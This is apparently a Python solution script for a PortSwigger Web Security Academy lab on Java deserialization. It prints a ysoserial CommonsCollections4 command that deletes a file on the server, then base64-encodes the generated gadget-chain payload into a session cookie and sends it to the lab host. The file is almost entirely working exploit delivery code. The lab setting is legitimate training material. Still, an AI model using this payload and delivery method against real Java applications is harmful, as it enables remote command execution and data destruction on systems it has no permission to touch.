"""
Lab 5: Exploiting Java deserialization with Apache Commons
https://portswigger.net/web-security/deserialization/exploiting/lab-exploiting-java-deserialization-with-apache-commons
Difficulty: Practitioner

📝 Textbook ysoserial usage. The gadget chain itself (CommonsCollections
family) is well-established tooling — see utils.YSOSERIAL_NOTE for setup.
This script handles the delivery half: base64 the generated payload into
the session cookie and send it.
"""

import base64

from utils import get_session, log, note, YSOSERIAL_NOTE

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
PAYLOAD_FILE = "payload.bin"  # output of the ysoserial command below


def run():
    note(YSOSERIAL_NOTE)
    note("Typical command for this specific lab (adjust the gadget chain")
    note("variant — 3, 4, 5, 6, 7 — if CommonsCollections1 doesn't land):")
    note("  java -jar ysoserial.jar CommonsCollections4 "
         "'rm /home/carlos/morale.txt' > payload.bin")

    try:
        with open(PAYLOAD_FILE, "rb") as f:
            raw = f.read()
    except FileNotFoundError:
        log(f"{PAYLOAD_FILE} not found — generate it with ysoserial first.", ok=False)
        return

    encoded = base64.b64encode(raw).decode()
    note(f"Base64-encoded payload ({len(encoded)} chars), setting as session cookie.")

    s = get_session()
    s.cookies.set("session", encoded)
    r = s.get(f"{TARGET}/")
    log(f"Status: {r.status_code}")
    print(r.text[-300:])


if __name__ == "__main__":
    run()
